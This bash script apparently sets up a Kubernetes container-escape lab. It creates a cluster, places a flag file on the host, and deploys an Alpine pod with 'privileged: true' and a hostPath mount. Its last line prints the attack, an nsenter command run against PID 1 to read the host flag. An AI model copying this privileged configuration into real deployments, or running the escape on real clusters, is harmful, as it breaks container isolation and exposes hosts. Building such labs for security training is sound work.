#!/bin/bash
set -euo pipefail
K8S_ID="k8s-11"
CLUSTER_NAME="cve-k8s-11-privileged"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

k8s_init
k8s_create_cluster
k8s_create_host_flag
k8s_load_images alpine:latest
k8s_wait_ready
k8s_apply << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
    - name: breakout
      image: alpine:latest
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

k8s_info
echo "[+] Attack: kubectl exec privileged-pod -- nsenter --mount --uts --ipc --net --pid --target 1 cat /host-flag/flag.txt"
